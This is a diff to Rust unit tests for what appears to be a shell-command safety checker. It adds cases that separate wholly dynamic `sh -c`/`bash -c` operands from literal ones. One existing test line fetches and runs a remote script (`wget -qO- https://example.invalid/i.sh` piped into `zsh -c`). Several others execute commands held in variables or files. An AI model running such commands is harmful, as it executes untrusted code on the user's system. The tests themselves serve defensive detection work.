@@ -38636,6 +38636,12 @@ mod tests {
         for command in [
             r#"bash -c "$X""#,
             r#"sh -c "${CMD}""#,
+            // Unquoted wholly dynamic operands (bd-vweh).
+            "sh -c $CMD",
+            "bash -lc $CMD; echo done",
+            "bash -c $(cat script.sh)",
+            "dash -c `cat script.sh`",
+            "sh -c ${CMD} && true",
             r#"sh -c "$1""#,
             r#"ksh -c "$X""#,
             r#"zsh -c "$(wget -qO- https://example.invalid/i.sh)""#,
@@ -38670,6 +38676,11 @@ mod tests {
             r#"bash -c 'echo "$1"' _ hello"#,
             r#"sh -c 'cd "$1" && make' _ /tmp/build"#,
             r#"bash -c "echo $HOME""#,
+            // Unquoted literal operands and partial expansions are unchanged.
+            "bash -c true",
+            "sh -c echo $HOME",
+            "bash -c ./build.sh",
+            "sh -c make$SUFFIX",
         ] {
             let result = evaluate_with_pack_ids_in_dialect(
                 command,
